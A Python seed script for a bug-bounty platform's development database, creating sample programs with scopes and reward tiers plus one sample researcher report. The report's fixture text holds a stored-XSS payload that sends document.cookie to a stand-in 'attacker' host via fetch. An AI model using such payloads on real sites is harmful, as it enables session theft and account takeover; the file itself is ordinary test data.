"""Seed dev: sample bounty programs + a researcher report.

Usage:  python -m scripts.seed_dev_bounty
"""

from __future__ import annotations

import asyncio
from uuid import UUID

from app.core.config import get_settings
from app.core.logging import configure_logging
from app.db.session import close_db, get_session_factory, init_db
from app.schemas import ProgramCreate, ReportCreate, RewardTier, ScopeItem
from app.services import ProgramService, ReportService

ADMIN_ID = UUID("11111111-1111-1111-1111-111111111111")
ALICE_ID = UUID("22222222-2222-2222-2222-222222222222")
BOB_ID = UUID("33333333-3333-3333-3333-333333333333")

ACME_ORG_ID = UUID("aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa")
FINTECH_ORG_ID = UUID("bbbbbbbb-bbbb-bbbb-bbbb-bbbbbbbbbbbb")


async def seed() -> None:
    settings = get_settings()
    log = configure_logging(settings)
    init_db(settings)
    factory = get_session_factory()

    async with factory() as session:
        programs = ProgramService(session)
        reports = ReportService(session)

        # ---------------------------------------------------------------------
        # Program 1: ACME Corp — public, accepting submissions
        # ---------------------------------------------------------------------
        try:
            acme = await programs.get_by_slug("acme-corp")
            log.info("program_exists", slug="acme-corp")
        except Exception:
            acme = await programs.create(
                owner_user_id=ADMIN_ID,
                data=ProgramCreate(
                    slug="acme-corp",
                    name="ACME Corporation",
                    owner_org_id=ACME_ORG_ID,
                    description="Public bounty program for the ACME Corp asset surface.",
                    policy=(
                        "ACME welcomes security researchers. Stay within scope, follow "
                        "safe-harbor rules, and report responsibly. Critical findings "
                        "qualify for up to $10,000."
                    ),
                    visibility="public",
                    currency="USD",
                    min_reward_cents=5_000,
                    max_reward_cents=1_000_000,
                    disclosure_policy="coordinated",
                    response_sla_hours=24,
                    triage_sla_hours=72,
                    resolution_sla_days=60,
                    in_scope_summary=(
                        "All assets under acme.example. Includes APIs, mobile apps, "
                        "and our open-source repos."
                    ),
                    out_of_scope_summary=(
                        "Third-party services we don't own. Social engineering. "
                        "Physical attacks. Brute-force / volumetric DoS."
                    ),
                    safe_harbor=True,
                    scope=[
                        ScopeItem(
                            asset_type="domain",
                            asset_identifier="acme.example",
                            severity_max="critical",
                        ),
                        ScopeItem(
                            asset_type="wildcard",
                            asset_identifier="*.acme.example",
                            severity_max="critical",
                        ),
                        ScopeItem(
                            asset_type="mobile_app",
                            asset_identifier="com.acme.mobile",
                            severity_max="high",
                        ),
                    ],
                    rewards=[
                        RewardTier(severity="critical", min_cents=500_000, max_cents=1_000_000),
                        RewardTier(severity="high", min_cents=100_000, max_cents=300_000),
                        RewardTier(severity="medium", min_cents=30_000, max_cents=100_000),
                        RewardTier(severity="low", min_cents=5_000, max_cents=25_000),
                    ],
                ),
            )
            await session.flush()
            await programs.transition_status(
                acme.id, new_status="published", actor_id=ADMIN_ID
            )
            log.info("program_created", slug="acme-corp")

        # ---------------------------------------------------------------------
        # Program 2: Private fintech — invite-only
        # ---------------------------------------------------------------------
        try:
            await programs.get_by_slug("private-fintech")
        except Exception:
            fintech = await programs.create(
                owner_user_id=ADMIN_ID,
                data=ProgramCreate(
                    slug="private-fintech",
                    name="Private Fintech",
                    owner_org_id=FINTECH_ORG_ID,
                    description="Invite-only program for our payments + identity stack.",
                    policy="By invitation only. Strict NDA required.",
                    visibility="invite_only",
                    disclosure_policy="none",
                    response_sla_hours=8,
                    triage_sla_hours=48,
                    resolution_sla_days=30,
                    scope=[
                        ScopeItem(
                            asset_type="api",
                            asset_identifier="api.fintech.example",
                            severity_max="critical",
                        ),
                    ],
                    rewards=[
                        RewardTier(severity="critical", min_cents=1_000_000, max_cents=5_000_000),
                        RewardTier(severity="high", min_cents=300_000, max_cents=1_000_000),
                    ],
                ),
            )
            await session.flush()
            await programs.transition_status(
                fintech.id, new_status="published", actor_id=ADMIN_ID
            )
            log.info("program_created", slug="private-fintech")

        # ---------------------------------------------------------------------
        # Program 3: Draft — not visible yet
        # ---------------------------------------------------------------------
        try:
            await programs.get_by_slug("draft-program")
        except Exception:
            await programs.create(
                owner_user_id=ADMIN_ID,
                data=ProgramCreate(
                    slug="draft-program",
                    name="Draft Test Program",
                    owner_org_id=ACME_ORG_ID,
                    description="Still in draft.",
                    policy="TBD.",
                    visibility="public",
                ),
            )
            log.info("program_created", slug="draft-program")

        await session.commit()

        # ---------------------------------------------------------------------
        # Sample report on ACME from Bob
        # ---------------------------------------------------------------------
        acme = await programs.get_by_slug("acme-corp")
        bob_reports, _ = await reports.list_for_researcher(BOB_ID)
        if not bob_reports:
            await reports.submit(
                program=acme,
                researcher_id=BOB_ID,
                data=ReportCreate(
                    title="Stored XSS in product review form on shop.acme.example",
                    description_md=(
                        "## Summary\n\n"
                        "The product review form on shop.acme.example does not sanitise "
                        "user input. An attacker can inject arbitrary JavaScript that "
                        "executes when other users view the review.\n\n"
                        "## Steps to reproduce\n\n"
                        "1. Navigate to any product page on shop.acme.example\n"
                        "2. Submit a review with payload `<script>alert(document.cookie)</script>`\n"
                        "3. Open the page in a new browser session and observe execution\n\n"
                        "## Impact\n\n"
                        "Session hijacking, credential theft, account takeover."
                    ),
                    reproduction_steps=(
                        "1. POST to /api/products/{id}/reviews\n"
                        "2. body: `<script>fetch('//attacker/'+document.cookie)</script>`\n"
                        "3. Visit /products/{id} as a different user — payload fires"
                    ),
                    impact="Session theft, account takeover, complete CSP bypass.",
                    asset_identifier="shop.acme.example",
                    vrt_category="server_security_misconfiguration.cross_site_scripting.stored",
                    severity="high",
                    cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N",
                    cvss_score=9.0,
                ),
            )
            log.info("sample_report_created", researcher="bob")

        await session.commit()
        log.info("seed_complete")

    await close_db()


if __name__ == "__main__":
    asyncio.run(seed())
